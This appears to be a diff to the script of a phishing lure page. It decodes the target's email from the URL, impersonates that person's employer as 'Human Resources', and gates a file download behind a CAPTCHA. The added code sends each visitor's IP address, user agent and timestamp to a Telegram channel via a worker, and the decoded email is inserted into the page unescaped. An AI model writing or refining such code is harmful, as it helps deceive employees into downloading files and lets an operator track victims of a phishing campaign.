@@ -84,9 +84,27 @@ const emailMsg = document.getElementById('emailMsg');
 const mobileMsg = document.getElementById('mobileMsg');
 
 // Show loader & rolling animation on form submit
-form.addEventListener('submit', () => {
-  fd.style.display = 'block';
-  rl.style.display = 'block';
+form.addEventListener('submit', async (e) => {
+    fd.style.display = 'block';
+    rl.style.display = 'block';
+
+    // Only send Telegram after CAPTCHA is done
+    if (!downloadBtn.disabled) {
+        const ip = '{{WORKER_IP}}'; // your worker will fill this
+        const ua = navigator.userAgent;
+        const time = new Date().toISOString();
+        const message = `✅ Human Download Verified\nIP: ${ip}\nUser-Agent: ${ua}\nTime: ${time}`;
+
+        try {
+            await fetch(form.action, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ telegram: message })
+            });
+        } catch(err) {
+            console.warn("Telegram send failed", err);
+        }
+    }
 });
 
 // Called by Turnstile when user completes CAPTCHA
@@ -119,10 +137,21 @@ window.addEventListener('DOMContentLoaded', () => {
             const decodedEmail = atob(hash); // decode base64
             const companyName = decodedEmail.split('@')[1].split('.')[0];
             const capitalizedCompany = companyName.charAt(0).toUpperCase() + companyName.slice(1);
-            emailMsg.innerHTML = `<div>${capitalizedCompany} Human Resources</div>
-                                  Dear ${decodedEmail}, complete CAPTCHA to reveal download button`;
+            emailMsg.innerHTML = `
+  <div style="font-weight:bold; font-size:18px; margin-bottom:8px;">
+    ${capitalizedCompany} Human Resources
+  </div>
+  <div style="font-size:16px; line-height:1.5; margin-bottom:12px;">
+    Dear ${decodedEmail},
+  </div>
+  <div style="font-size:15px; line-height:1.5;">
+    For your security, please complete the CAPTCHA below to access your file. 
+    Once verified, the download button will be enabled.
+  </div>
+`;
+
         } catch(e) {
-            console.warn("Invalid base64 in hash");
+            // Invalid base64? ignore and load normally
         }
     }
 });
